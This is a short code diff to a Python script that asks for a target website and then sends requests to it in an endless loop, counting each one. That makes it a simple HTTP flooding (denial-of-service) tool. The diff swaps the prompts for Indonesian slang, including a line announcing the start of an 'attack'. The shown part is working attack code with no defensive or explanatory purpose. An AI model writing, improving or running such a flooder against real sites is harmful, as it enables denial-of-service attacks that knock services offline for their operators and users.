@@ -166,11 +166,11 @@ try :#line:181
 except Exception as e :#line:183
     print (e )#line:184
     pass
-site = input("Target: ")
+site = input("Target nya: ")
  
-print("Requests sending to: " + site)
+print("memulai serangan XiuaZ: " + site)
 while i == i:
 	with urlopen(site) as response:
 		html = str(response.read())
 	y += 1
-	print("Success! Request Number: " + str(y))
+	print("Success! coy :): " + str(y))
